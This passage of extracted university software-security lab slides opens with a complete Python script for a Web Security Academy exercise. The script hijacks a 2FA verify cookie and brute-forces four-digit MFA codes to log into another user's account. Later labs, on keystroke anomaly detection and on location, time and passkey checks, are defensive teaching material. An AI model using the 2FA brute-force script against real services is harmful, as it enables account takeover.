+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 4/12\nget_email_otp() 2/4 \u2014 find candidate message links\nlabel = link.get_text(\" \", strip=True)\n        description = (href + \" \" + label).lower()\n        if parsed_link.netloc != email_host:\n            continue\n        if href in visited:\n            continue\n        if any(word in description for word in (\n            \"email\", \"message\", \"inbox\", \"mail\", \"view\"\n        )):\n            if not any(word in description for word in (\n                \"logout\", \"delete\", \"clear\"\n            )):\n                candidate_links.append((href, label))\n    for href, label in candidate_links[:10]:\n        visited.add(href)\n        try:\n            message = session.get(href, timeout=15)"
+      },
+      {
+        "page": 16,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 5/12\nget_email_otp() 3/4 \u2014 follow links, print contents\nmessage.raise_for_status()\n            text, _ = extract_text(message.text)\n            pages.append((label or href, text))\n        except requests.RequestException as exc:\n            print(\"[!] Could not open message link:\", exc)\n    all_text = \"\\n\\n\".join(\n        f\"--- {label} ---\\n{text}\"\n        for label, text in pages\n    )\n    print(\"\\n========== EMAIL CONTENTS ==========\")\n    print(all_text[:12000])\n    print(\"===================================\\n\")\n    context_patterns = [\n        r\"(?i)(?:security|verification|authentication|MFA|2FA)\"\n        r\".{0,100}?\\b(\\d{4})\\b\",\n        r\"(?i)\\b(\\d{4})\\b.{0,100}?\"\n        r\"(?:security|verification|authentication|MFA|2FA)\",\n    ]"
+      },
+      {
+        "page": 17,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 6/12\nget_email_otp() 4/4 \u2014 extract the 4-digit code\nfor pattern in context_patterns:\n        matches = list(dict.fromkeys(\n            re.findall(pattern, all_text, re.DOTALL)\n        ))\n        if matches:\n            print(\"[+] Possible MFA code(s):\", matches)\n            return matches\n    candidates = list(dict.fromkeys(\n        re.findall(r\"(?<!\\d)\\d{4}(?!\\d)\", all_text)\n    ))\n    if candidates:\n        print(\"[?] Four-digit candidates:\", candidates)\n        print(\"[!] Check the message text to identify the MFA code.\")\n    else:\n        print(\"[-] No four-digit code found.\")\n        print(\"[!] Check the Email client URL and inbox contents.\")\n    return candidates"
+      },
+      {
+        "page": 18,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 7/12\nmain() 1/6 \u2014 configuration (edit the highlighted lines)\ndef main():\n    target = \"https://YOUR-LAB-ID.web-security-academy.net\".strip().rstrip(\"/\")\n    email_url = \"https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/email\".strip()\n    parsed = urlparse(target)\n    hostname = parsed.hostname\n    parsed_email = urlparse(email_url)\n    if (\n        parsed.scheme != \"https\"\n        or not hostname\n        or not hostname.endswith(\".web-security-academy.net\")\n    ):\n        sys.exit(\"[-] Enter the HTTPS URL of your active lab.\")\n    if parsed_email.scheme != \"https\" or not parsed_email.netloc:\n        sys.exit(\"[-] Enter the actual HTTPS Email client URL.\")\nReplace these with your real lab URL and exploit-server email URL."
+      },
+      {
+        "page": 19,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 8/12\nmain() 2/6 \u2014 session setup, Step 1, Step 2\nwith requests.Session() as client:\n        client.trust_env = False\n        client.verify = False\n        if USE_BURP:\n            client.proxies.update(PROXIES)\n        try:\n            # 1. Initialize the lab session.\n            response = client.get(f\"{target}/login\", timeout=15)\n            response.raise_for_status()\n            print(\"[+] Login page loaded\")\n            # 2. Ask the lab to generate a temporary code for Carlos.\n            set_verify(client, hostname, \"carlos\")\n            response = client.get(\n                f\"{target}/login2\",\n                allow_redirects=False,\n                timeout=15,\n            )"
+      },
+      {
+        "page": 20,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 9/12\nmain() 3/6 \u2014 Step 2 result, Step 3 (log in as wiener)\nprint(\n                \"[+] Carlos MFA request:\",\n                response.status_code,\n                response.headers.get(\"Location\", \"(none)\"),\n            )\n            # 3. Log in with the lab-provided Wiener credentials.\n            response = client.post(\n                f\"{target}/login\",\n                data={\"username\": \"wiener\", \"password\": \"peter\"},\n                allow_redirects=False,\n                timeout=15,\n            )\n            print(\"[+] Wiener login:\", response.status_code)\n            print(\n                \"[+] Login redirect:\",\n                response.headers.get(\"Location\", \"(none)\"),\n            )\n            if response.status_code not in (200, 301, 302, 303):\n                sys.exit(\"[-] Unexpected login response.\")"
+      },
+      {
+        "page": 21,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 10/12\nmain() 4/6 \u2014 validate login, Step 4, Step 5\n            if \"Invalid username or password\" in response.text:\n                sys.exit(\"[-] Wiener credentials were rejected.\")\n            # 4. Load Wiener's MFA page to trigger the normal flow.\n            set_verify(client, hostname, \"wiener\")\n            response = client.get(\n                f\"{target}/login2\",\n                allow_redirects=False,\n                timeout=15,\n            )\n            print(\"[+] Wiener MFA page:\", response.status_code)\n            # 5. Read Wiener's message from the separate Email client.\n            get_email_otp(client, email_url)\n            # 6. Submit one invalid code to reproduce the lab workflow.\n            set_verify(client, hostname, \"wiener\")\n            response = client.post("
+      },
+      {
+        "page": 22,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 11/12\nmain() 5/6 \u2014 Step 6 (test code), Step 7 begins\nf\"{target}/login2\",\n                data={\"mfa-code\": \"9999\"},\n                allow_redirects=False,\n                timeout=15,\n            )\n            print(\"[+] Initial MFA verification:\", response.status_code)\n            # 7. Test the target account's verification flow.\n            # This sends sequential requests to your active lab.\n            set_verify(client, hostname, \"carlos\")\n            for number in range(10000):\n                code = f\"{number:04d}\"\n                response = client.post(\n                    f\"{target}/login2\",\n                    data={\"mfa-code\": code},\n                    allow_redirects=True,\n                    timeout=15,\n                )"
+      },
+      {
+        "page": 23,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 12/12\nmain() 6/6 \u2014 loop result, error handling, entry point\nif number % 100 == 0:\n                    print(f\"[*] Tried {number:04d} ({number}/10000)\", flush=True)\n                if \"Your username is: carlos\" in response.text:\n                    print(f\"\\n[+] MFA code: {code}\")\n                    print(\"[+] Logged in as carlos\")\n                    print(\"[+] Check the Academy page for completion\")\n                    return\n            print(\"\\n[-] No successful code detected.\")\n            print(\"[-] Inspect the /login2 responses in Burp.\")\n        except requests.exceptions.ProxyError as exc:\n            print(\"[-] Burp proxy connection failed:\", exc)\n            print(\"    Check that the listener is running on port 8080.\")\n        except requests.exceptions.RequestException as exc:\n            print(\"[-] HTTP request failed:\", exc)\nif __name__ == \"__main__\":\n    main()"
+      },
+      {
+        "page": 24,
+        "text": "Lab 3.1  \u00b7  Script Explained \u2014 Helper Functions\n1 set_verify(). One-liner that writes the verify cookie for a given username \u2014 this is the hijack, \nreused for both carlos and wiener throughout the script.\n2 extract_text(). Strips <script>/<style> tags out of a page and joins the remaining visible text \u2014 \nturns any raw HTML into something regex can search cleanly.\n3 get_email_otp(). Opens the exploit-server Email client, follows any links that look like a message \n(not logout/delete), and reads every page it finds.\n4 Two-pass code extraction. First it looks for a 4-digit number near words like 'verification' or 'MFA'. \nIf that fails, it falls back to listing every 4-digit number on the page for you to check by eye."
+      },
+      {
+        "page": 25,
+        "text": "Lab 3.1  \u00b7  Script Explained \u2014 Attack Flow in main()\n1 Steps 1\u20133: prime and log in. Loads /login, pokes /login2 as carlos to make the server generate his \ncode, then actually logs in as wiener with the real credentials.\n2 Steps 4\u20136: the real 2FA flow. Reloads wiener's own /login2, scrapes the OTP straight out of the \nemail client, then submits a deliberately wrong code (9999) to reset the verification state cleanly.\n3\nStep 7: the brute-force loop. Switches verify back to carlos and posts every 4-digit code with \nallow_redirects=True, then checks whether 'Your username is: carlos' shows up on the final page \n\u2014 that confirms a real, followed-through login.\n4 Error handling. try/except wraps the whole flow: a ProxyError means Burp isn't listening, any \nother RequestException is reported without crashing the script mid-loop."
+      },
+      {
+        "page": 26,
+        "text": "Lab 3.1  \u00b7  Expected Output RESULT\nConsole output once the brute-force loop finds the code\n[+] Login page loaded\n[+] Carlos MFA request: 200 (none)\n[+] Wiener login: 200 (none)\n[*] Opening Email client: https://...exploit-server.net/email\n[*] Email client status: 200\n[+] Possible MFA code(s): ['4821']\n[+] Initial MFA verification: 200\n[*] Tried 0000 (0/10000)\n[*] Tried 4800 (4800/10000)\n[+] MFA code: 4821\n[+] Logged in as carlos\n[+] Check the Academy page for completion\nKEY INSIGHT\nThis version reads the OTP for you and confirms success by following the redirect to the real account page, rather than just checking \nfor a bare 302."
+      },
+      {
+        "page": 27,
+        "text": "Lab 3.1  \u00b7  Hands-on, 3 marks\n1 Assumption, 1 mark. In one sentence, what did the second-factor step believe about the account \nname in the request?\n2 Impact, 1 mark. Whose account is exposed, and which of the two login steps was skipped for that \nperson?\n3 Fix, 1 mark. What must the server store after the password, and which request field must it \nignore?"
+      },
+      {
+        "page": 28,
+        "text": "Get Ready For Quiz 1 Next Time!"
+      },
+      {
+        "page": 29,
+        "text": "Thank you"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lab_4.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "Software Security\nLab 4  \u00b7  Anomaly Behavior Detection\n\u00a9 Eng. Ahmed Awad & Eng. Manal Amr\nAhmed.awad@sut.edu.eg\nManal.gafar@sut.edu.eg\nCET431"
+      },
+      {
+        "page": 2,
+        "text": "What is Behavioral Authentication?\n1 The old question.  Classic authentication asks \u201cwho are you?\u201d once \u2014 a password or an OTP at the door. After that, it trusts you for the whole \nsession.\n2 The new question.  Behavioral authentication keeps asking \u201cdoes this still act like you?\u201d using patterns: typing rhythm, login time, location, \nand device.\n3 Anomaly detection.  We learn each user\u2019s normal behavior, then flag any login that is statistically far from that normal \u2014 a likely account \ntakeover.\n4 The response.  An anomaly does not always block. It often triggers step-up MFA \u2014 exactly the \u201cnever trust, always verify\u201d idea of Zero Trust.\nDr. Ayman Taha - Dr. Donia Gamal 2"
+      },
+      {
+        "page": 3,
+        "text": "How to Think, Before You Code\n1 1. Collect history.  Gather the user\u2019s past, trusted logins. Each login becomes a row of numeric features (hour, typing speed, distance from \nhome).\n2 2. Learn \u201cnormal\u201d.  For every feature compute the mean (the center) and the standard deviation (how much it usually varies).\n3 3. Score the new login.  Measure how many standard deviations the new value is from the mean \u2014 this single number is the z-score.\n4 4. Decide.  Average the z-scores. If the average is above a threshold, the behavior is abnormal \u2192 challenge or block it.\nDr. Ayman Taha - Dr. Donia Gamal 3"
+      },
+      {
+        "page": 4,
+        "text": "Lab 4.1\nAnomaly Behavior Detection\nDr. Ayman Taha - Dr. Donia Gamal 4"
+      },
+      {
+        "page": 5,
+        "text": "Lab 4.1  \u00b7  Overview\n1 The goal.  Build a tiny detector that decides ALLOW or BLOCK for each login: the password is checked first, then HOW you type it.\n2 The features.  Measured live from your typing: typing speed (keys/sec) and the time between each pair of keys (gap_1, gap_2, \u2026).\n3 The method.  Statistical anomaly detection with the z-score. Pure Python \u2014 only built-in modules (statistics, time, sys, os).\n4 The win.  The real owner typing naturally is allowed; a pasted or very different typing rhythm is blocked automatically.\nDr. Ayman Taha - Dr. Donia Gamal 5"
+      },
+      {
+        "page": 6,
+        "text": "Lab 4.1  \u00b7  The Pipeline, Step by Step\n1\nHistory\n5 samples you type \u25b8\n2\nBuild profile\nmean + std per feature \u25b8\n3\nNew login\nspeed + key gaps \u25b8\n4\nz-score\ndistance from normal \u25b8\n5\nAverage\none anomaly score \u25b8\n6\nDecision\nALLOW or BLOCK + MFA\nEach stage is one small function in the script on the next slides.\nDr. Ayman Taha - Dr. Donia Gamal 6"
+      },
+      {
+        "page": 7,
+        "text": "Lab 4.1  \u00b7  The One Idea You Need \u2014 the z-score\nThe z-score answers: \u201chow surprising is this value, compared to what\u2019s normal?\u201d\nz = | value \u2212 mean | \u00f7 std\n1 mean  the average of past values \u2014 the center of \u201cnormal\u201d.\n2 std  standard deviation \u2014 how much the value normally bounces around.\n3 z \u2248 0  looks completely normal.  z > 3  \u2192  rare, suspicious, worth a challenge.\nDr. Ayman Taha - Dr. Donia Gamal 7"
+      },
+      {
+        "page": 8,
+        "text": "Lab 4.1  \u00b7  The Only Library We Need\n1 statistics  (built-in).  Part of Python\u2019s standard library \u2014 no pip install. It gives us the two numbers that define \u201cnormal\u201d.\n2 statistics.mean(values).  Returns the average of a list of numbers \u2014 the center of the user\u2019s behavior for one feature.\n3 statistics.pstdev(values).  Returns the population standard deviation \u2014 how widely that feature normally varies around the mean.\nAlso built-in: time (key timestamps), sys and os (read the keyboard)..\nDr. Ayman Taha - Dr. Donia Gamal 8"
+      },
+      {
+        "page": 9,
+        "text": "Lab 4.1  \u00b7  Full Python Script CODE 1/4\nImports and the four Lab 4.1 functions\n# Lab 4.1 - LIVE: the history is built from YOUR real typing, measured key by key\nimport os, statistics, sys, time\nTHRESHOLD = 3.0\ndef build_profile(history, features):\nreturn {f: {\"mean\": statistics.mean(r[f] for r in history),\n\"std\":  statistics.pstdev(r[f] for r in history)} for f in features}\ndef z_score(value, mean, std):\nif std == 0:\nstd = 0.1\nreturn abs(value - mean) / std\ndef anomaly_score(login, profile, features):\nscores = [z_score(login[f], profile[f][\"mean\"], profile[f][\"std\"]) for f in features]\nreturn sum(scores) / len(scores)\ndef authenticate(login, profile, features, threshold):\nscore = anomaly_score(login, profile, features)\nreturn (\"BLOCK  (step-up MFA required)\" if score > threshold else \"ALLOW\"), score\nDr. Ayman Taha - Dr. Donia Gamal 9"
+      },
+      {
+        "page": 10,
+        "text": "Lab 4.1  \u00b7  Full Python Script CODE 2/4\nread_secret() reads the password key by key and timestamps every key\n# ---- read the password key by key, timing every key ----\ndef read_secret(prompt):\n\"\"\"Returns (password, key_timestamps). Shows * for each key.\"\"\"\nprint(prompt, end=\"\", flush=True)\nchars, stamps = [], []\nif os.name == \"nt\":\nimport msvcrt\ngetch, restore = msvcrt.getwch, lambda: None\nelse:\nimport termios, tty\nfd = sys.stdin.fileno(); old = termios.tcgetattr(fd); tty.setcbreak(fd)\ngetch, restore = (lambda: sys.stdin.read(1)), (lambda: termios.tcsetattr(fd, termios.TCSADRAIN, old))\ntry:\nwhile (ch := getch()) not in (\"\\r\", \"\\n\"):\nif ch in (\"\\x7f\", \"\\b\"):                       # backspace\nif chars: chars.pop(); stamps.pop(); print(\"\\b \\b\", end=\"\", flush=True)\nelif ch.isprintable():\nchars.append(ch); stamps.append(time.perf_counter()); print(\"*\", end=\"\", flush=True)\nfinally:\nrestore(); print()\nreturn \"\".join(chars), stamps\nDr. Ayman Taha - Dr. Donia Gamal 10"
+      },
+      {
+        "page": 11,
+        "text": "Lab 4.1  \u00b7  Full Python Script CODE 3/4\ntyping_features() turns the timestamps into features; enrollment builds the history from YOUR typing\ndef typing_features(stamps):\ngaps = [b - a for a, b in zip(stamps, stamps[1:])]                  # time between keys\nf = {\"typing_speed\": len(gaps) / (stamps[-1] - stamps[0])}          # keys/sec\nf.update({f\"gap_{i}\": g for i, g in enumerate(gaps, 1)})            # key i -> i+1 (s)\nreturn f\n# ---- Enroll, then log in ----\nPASSWORD = input(\"Choose a password: \")   # demo only: real systems store a salted slow hash\nhistory = []\nprint(\"Type it 5 times, naturally.\")\nwhile len(history) < 5:\npw, st = read_secret(f\"  Sample {len(history) + 1}/5: \")\nif pw == PASSWORD:\nhistory.append(typing_features(st))\nDr. Ayman Taha - Dr. Donia Gamal 11"
+      },
+      {
+        "page": 12,
+        "text": "Lab 4.1  \u00b7  Full Python Script CODE 4/4\nBuild the profile, then log in: password check (factor 1) + typing-behaviour check (factor 2)\nfeatures = list(history[0])\nprofile = build_profile(history, features)\nfor f in features:                          # std floor: a very steady typist must not get std ~ 0\nprofile[f][\"std\"] = max(profile[f][\"std\"], 0.3 if f == \"typing_speed\" else 0.04)\nwhile input(\"\\nEnter = log in (q to quit): \").lower() != \"q\":\npw, st = read_secret(\"Password: \")\nif pw != PASSWORD:\nprint(\"   DENIED  (wrong password)\"); continue\nlogin = typing_features(st)\ndecision, score = authenticate(login, profile, features, THRESHOLD)\nprint(f\"\\n   {'feature':13s} {'you':>7s} {'normal':>7s} {'z':>6s}\")\nfor f in features:\nm, s = profile[f][\"mean\"], profile[f][\"std\"]\nprint(f\"   {f:13s} {login[f]:7.2f} {m:7.2f} {z_score(login[f], m, s):6.2f}\")\nprint(f\"\\n   anomaly score = {score:.2f} (threshold {THRESHOLD})  ->  {decision}\")\nDr. Ayman Taha - Dr. Donia Gamal 12"
+      },
+      {
+        "page": 13,
+        "text": "Lab 4.1  \u00b7  The Output\nRun it with:   python3 lab4_1_live_typing.py   (type the password 5 times to enroll, then log in)\nPassword: ****\nfeature           you  normal      z\ntyping_speed     6.23    6.32   0.27\ngap_1            0.16    0.15   0.27\ngap_2            0.17    0.16   0.17\ngap_3            0.15    0.16   0.30\nanomaly score = 0.25 (threshold 3.0)  ->  ALLOW\nPassword: ****      # same password, pasted / typed far too fast\nfeature           you  normal      z\ntyping_speed    47.50    6.32 117.90\ngap_1            0.02    0.15   3.30\ngap_2            0.02    0.16   3.39\ngap_3            0.02    0.16   3.63\nanomaly score = 32.05 (threshold 3.0)  ->  BLOCK  (step-up MFA required)\nHow to read it:  the real owner typing naturally lands about 0.3 std-devs from the learned profile on every feature (average 0.25) \u2192 ALLOW. The pasted \nlogin has a typing speed 118 std-devs from normal and every key gap is over 3 std-devs off, so the average score (32.05) explodes past the threshold of \n3.0 \u2192 BLOCK. Your own numbers will differ a little each run: they come from how you actually type.\nDr. Ayman Taha - Dr. Donia Gamal 13"
+      },
+      {
+        "page": 14,
+        "text": "Real Systems  \u00b7  Where the Features Come From\n1 Typing speed & rhythm.  The browser (JavaScript on the login page) timestamps every key press and sends the timings with the login request; \na mobile app SDK reads touch and sensors. This lab does the same in the terminal.\n2 Hour & distance.  The server adds these itself: the hour from its own clock, the distance from the IP address (a GeoIP database gives the city,\nthen the distance from the user\u2019s usual \u201chome\u201d city). The user cannot edit them.\n3 Where they are stored.  On the server, one database row per trusted login: user, time, hour, typing_speed, distance_km. Many systems keep \nonly the mean and std and update them each login. In this lab the \u201cdatabase\u201d is the list history.\n4 Care needed.  Learn only from trusted logins (so an attacker cannot teach the system), keep the data encrypted, and get the user\u2019s consent:\nkeystroke data is sensitive.\nDr. Ayman Taha - Dr. Donia Gamal 14"
+      },
+      {
+        "page": 15,
+        "text": "Real Systems  \u00b7  How Authentication Reads Them\n1\nLogin request\npassword, key timings, IP, \ntime\n\u25b8\n2\nCheck password\nsalted hash must match \u25b8\n3\nLoad profile\nmean + std from the \ndatabase\n\u25b8\n4\nFeatures\nspeed, gaps, hour, distance \u25b8\n5\nCompare\nz-score, then average \u25b8\n6\nDecision\nALLOW, MFA or BLOCK\nAfter ALLOW, this login is added to the user\u2019s history, so the profile keeps up with how they type.\nDr. Ayman Taha - Dr. Donia Gamal 15"
+      },
+      {
+        "page": 16,
+        "text": "Lab 4.1  \u00b7  Why This Matters\n1 Continuous & invisible.  The user does nothing extra. Security runs quietly in the background \u2014 good \u201cpsychological acceptability.\u201d\n2 Risk-based response.  Instead of a hard block, real systems step up: ask for OTP , email confirmation, or a security question only when the \nscore is high.\n3 Caveat \u2014 feature scales.  A very steady typist has a tiny std, so one small slip gives a huge z-score \u2014 the code sets a minimum std. Real \nsystems also normalise features so each one counts fairly.\n4 Caveat \u2014 cold start.  A brand-new user has no history yet, so there is no \u201cnormal\u201d to compare against. You need enough logins before trusting \nthe score.\nDr. Ayman Taha - Dr. Donia Gamal 16"
+      },
+      {
+        "page": 17,
+        "text": "Lab 4.2\nYour turn \u2014 fill in the missing functions\nDr. Ayman Taha - Dr. Donia Gamal 17"
+      },
+      {
+        "page": 18,
+        "text": "Lab 4.2  \u00b7  Keystroke-Dynamics Challenge\n1 The idea.  A real user types their password in about the same time every login. A bot that pastes it is far too fast; an attacker who doesn\u2019t \nknow it is too slow.\n2 Your task.  The same anomaly-detection pattern, but on one feature: typing time. Four functions are left blank \u2014 fill them in so the program\nruns.\n3 To fill in.  mean_time(), std_time(), z_score(), and is_anomaly(). The driver code is written for you \u2014 do not change it.\n4 Success looks like.  The tired-but-real user is allowed; the pasting bot and the slow attacker are both flagged as anomalies.\nDr. Ayman Taha - Dr. Donia Gamal 18"
+      },
+      {
+        "page": 19,
+        "text": "Lab 4.2  \u00b7  Exercise Code CODE 1/2\nThe data and the first two functions to complete\nimport statistics\n# A user's NORMAL profile: seconds taken to type the\n# password across several past, trusted logins.\ntyping_history = [1.20, 1.35, 1.28, 1.22,\n1.31, 1.26, 1.24, 1.30]\n# New attempts to check: (description, typing_time_seconds)\nattempts = [\n(\"Legit user, slightly tired\", 1.40),\n(\"Bot pasting the password\",   0.15),\n(\"Attacker typing, unsure\",    2.90),\n]\nTHRESHOLD = 3.0\ndef mean_time(samples):\n# TODO: return the average (mean) of the list samples\npass\ndef std_time(samples):\n# TODO: return the population std-dev of samples\n# Hint: statistics.pstdev(samples)\npass\nDr. Ayman Taha - Dr. Donia Gamal 19"
+      },
+      {
+        "page": 20,
+        "text": "Lab 4.2  \u00b7  Exercise Code CODE 2/2\nThe last two functions, then the driver code you must not change\ndef z_score(value, mean, std):\n# TODO: how many std-devs is value from mean?\n#   guard std == 0 (use 0.1), then\n#   return abs(value - mean) / std\npass\ndef is_anomaly(value, mean, std, threshold):\n# TODO: return True if the z-score is greater\n#       than threshold, else return False\npass\n# ----------- Driver code: do NOT change -----------\nm = mean_time(typing_history)\ns = std_time(typing_history)\nprint(f\"Normal typing: mean={m:.2f}s  std={s:.2f}s\\n\")\nfor name, t in attempts:\nz = z_score(t, m, s)\nhit = is_anomaly(t, m, s, THRESHOLD)\ntag = \"ANOMALY -> block / MFA\" if hit else \"OK -> allow\"\nprint(f\"{name:28s} t={t:.2f}s  z={z:5.2f}  {tag}\")\nDr. Ayman Taha - Dr. Donia Gamal 20"
+      },
+      {
+        "page": 21,
+        "text": "Lab 4.2  \u00b7  Expected Output When Correct\nNormal typing: mean=1.27s  std=0.05s\nLegit user, slightly tired   t=1.40s  z= 2.79  OK -> allow\nBot pasting the password     t=0.15s  z=24.02  ANOMALY -> block / MFA\nAttacker typing, unsure      t=2.90s  z=34.95  ANOMALY -> block / MFA\n1 Hint 1.  mean_time \u2192 return statistics.mean(samples).   std_time \u2192 return statistics.pstdev(samples).\n2 Hint 2.  z_score \u2192 if std == 0: std = 0.1, then return abs(value - mean) / std.\n3 Hint 3.  is_anomaly \u2192 return z_score(value, mean, std) > threshold  (that already gives True / False).\nDr. Ayman Taha - Dr. Donia Gamal 21"
+      },
+      {
+        "page": 22,
+        "text": "Lab 4  \u00b7  What to Hand In\n1 1.  Completed code.  Your finished exercise.py with all four functions working and the program running end-to-end.\n2 2.  A screenshot.  A screenshot of your terminal showing the output, matching the expected result on the previous slide.\n3 3.  Two short answers.  Why is averaging z-scores risky when one feature (like distance) has a much larger scale? And: what would you do for a \nbrand-new user with no history?\n4 4.  One extension (bonus).  Add a new behavioural feature (e.g. device ID or mouse speed) to the worked example and show one login it \nnewly catches.\nDr. Ayman Taha - Dr. Donia Gamal 22"
+      },
+      {
+        "page": 23,
+        "text": "Thank you"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lab_5.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "CET431\n\u00a9 Eng. Ahmed Awad & Eng. Manal Amr\nAhmed.awad@sut.edu.eg\nManal.gafar@sut.edu.eg\nSoftware Security\nLab 5  \u00b7  Location, Time, and Passkeys"
+      },
+      {
+        "page": 2,
+        "text": "CET431    \u00b7    REMINDER\nQuiz in week 7\nThe quiz is on the lecture content.\nBring a pen. The quiz is in week 7.\n2   /   38"
+      },
+      {
+        "page": 3,
+        "text": "From Lab 4\nLab 4 already scored the rhythm\nCET431 Lab 5    \u00b7    location, time, passkey 3   /   38Click  \u00b7  next step\nA matching password was only the first gate. Lab 4 then asked whether the typing looked like the owner.\nEnrollment built a personal profile\nFive typings of ahmed. Mean and population standard deviation of typing_speed and of each gap.\nThe anomaly score is an average of z-scores\nEach feature contributes |value - mean| / std. The threshold in that lab is 3.0.\nAbove 3.0 blocks the login\nBLOCK asks for step-up MFA. Wrong letters are DENIED before any timing score is computed."
+      },
+      {
+        "page": 4,
+        "text": "The gap\nPlace and clock were invisible to Lab 4\nCET431 Lab 5    \u00b7    location, time, passkey 4   /   38Click  \u00b7  next step\nThe keystroke profile can block a paste. It cannot see where the attempt is, or what hour it is.\nA real user in London still types like the owner\nDistance from home never entered the Lab 4 score. 3511 km away could still be ALLOW.\n03:00 was not a feature\nLab 4 has no hour window. A genuine rhythm at night passed the same threshold as a rhythm at 10:00.\nA typed password can still be phished\nThe rhythm check runs after the letters are already disclosed. A passkey signs a challenge for the real site instead."
+      },
+      {
+        "page": 5,
+        "text": "This lab\nLab 5 keeps the password and adds three checks\nCET431 Lab 5    \u00b7    location, time, passkey 5   /   38Click  \u00b7  next step\nSame shape of decision as Lab 4. Every required check must pass, or the login is BLOCK.\nWhere\nLocation\nInside 50 km of the enrolled home. \nOutside is BLOCK (location).\nWhen\nTime\nLocal hour in [8, 22). TOTP is the other \ntime-based proof: a 6-digit code that \nchanges every 30 seconds.\nWhich key\nPasskey\nFIDO means Fast Identity Online. The \nserver stores a public key. The \nauthenticator signs this login's \nchallenge."
+      },
+      {
+        "page": 6,
+        "text": "The gate\nOne login, three questions\nCET431 Lab 5    \u00b7    location, time, passkey 6   /   38Click  \u00b7  next step\nThe password can still be the first gate. These three checks run with it. Any miss blocks the login.\nWhere?    Location\nIs this attempt inside 50 km of the enrolled home?\nWhen?    Time\nIs the local hour inside 08:00 up to, but not including, 22:00?\nWho holds the key?    Passkey\nDid the authenticator sign this challenge with the stored public key?"
+      },
+      {
+        "page": 7,
+        "text": "Step 1\nLocation-based: distance from home\nCET431 Lab 5    \u00b7    location, time, passkey 7   /   38\nThe server stores a home latitude, a home longitude, and a radius. The login sends a new point.\na = sin(dlat/2)^2 + cos(lat1)*cos(lat2)*sin(dlon/2)^2\ndistance_km = 6371 * 2 * atan2(sqrt(a), sqrt(1-a))\nlocation ok when distance_km <= 50\nWhy haversine\nLatitude and longitude sit on a sphere. \nSubtracting the degrees is not a distance in \nkilometres.\nThe decision\nInside the radius continues. Outside it is \nBLOCK (location), even if the passkey is \ngenuine.\nWhat we trust\nThis lab treats the coordinates as given. \nThe check is the policy, not a proof of GPS \nhardware."
+      },
+      {
+        "page": 8,
+        "text": "Step 1\nLocation example: home, nearby, London\nCET431 Lab 5    \u00b7    location, time, passkey 8   /   38Click  \u00b7  next step\nHome is (30.0444, 31.2357). Radius is 50 km. Same numbers as the lab script.\nSame point as home\n(30.0444, 31.2357)\n0.0 km    INSIDE the 50 km radius\nNearby point\n(30.0131, 31.2089)\n4.3 km    INSIDE the 50 km radius\nLondon\n(51.5074, -0.1278)\n3511.3 km    OUTSIDE the 50 km radius"
+      },
+      {
+        "page": 9,
+        "text": "Step 2\nTime-based means two different checks\nCET431 Lab 5    \u00b7    location, time, passkey 9   /   38\nBoth use the clock. They answer different questions. The hands-on implements the window.\nAccess window\nIs this hour allowed for the account?\nThis lab: 8 <= hour < 22.\n08:00 is allowed. 22:00 is not.\nThe window does not wrap past midnight.\nTOTP\nCan you produce the current 6-digit code?\nThe code changes every 30 seconds.\nIt comes from a shared secret and the time.\nThe next slide freezes one code."
+      },
+      {
+        "page": 10,
+        "text": "Step 2\nTOTP: one frozen 30-second step\nCET431 Lab 5    \u00b7    location, time, passkey 10   /   38Click  \u00b7  next step\nRFC 6238. HMAC-SHA1 of the shared secret and the counter. Counter = unix time // 30.\ncounter = unix_time // 30\ndigest  = HMAC-SHA1(secret, counter)\ncode    = 6 digits taken from that digest\n22 Oct 2026, 07:00 UTC  (10:00 in UTC+3)\ncode = 547927\nSame secret, 30 seconds later\ncode = 389939\nThe secret stays on the server and in the authenticator app. A photo of one code dies when the step ends. The hands-on does not ask you to code \nthis."
+      },
+      {
+        "page": 11,
+        "text": "Passkey\nFIDO stands for Fast Identity Online\nCET431 Lab 5    \u00b7    location, time, passkey 11   /   38Click  \u00b7  next step\nThe name is the standard. A passkey is one kind of FIDO2 credential.\nFIDO\nFast Identity Online. The FIDO Alliance publishes the standards.\nFIDO2\nWebAuthn in the browser, plus CTAP , the Client to Authenticator Protocol.\nPasskey\nA FIDO2 credential. The server stores the public key. The private key stays on the authenticator."
+      },
+      {
+        "page": 12,
+        "text": "Step 3\nPasskey / FIDO2: sign a challenge\nCET431 Lab 5    \u00b7    location, time, passkey 12   /   38\nFIDO means Fast Identity Online. FIDO2 is WebAuthn plus CTAP . A passkey is a FIDO2 credential.\n1  Register\nThe authenticator creates a key pair. The server stores the public key and a credential id.\n2  Challenge\nAt login the server sends a fresh random challenge. It does not send a shared secret.\n3  Sign\nThe private key signs that challenge, usually after a local fingerprint or device PIN. The private key stays put.\n4  Verify\nThe server checks the signature with the stored public key. Valid signature and matching credential id are both required."
+      },
+      {
+        "page": 13,
+        "text": "Step 3\nPasskey example: genuine, flipped, wrong id\nCET431 Lab 5    \u00b7    location, time, passkey 13   /   38Click  \u00b7  next step\nChallenge text: CET431-login-challenge. passkey_allowed needs both arguments true.\nGenuine signature, matching credential\npasskey_allowed(True, True)\nALLOW\nOne byte of the signature flipped\npasskey_allowed(True, False)\nBLOCK\nSignature would be valid for another credential\npasskey_allowed(False, True)\nBLOCK"
+      },
+      {
+        "page": 14,
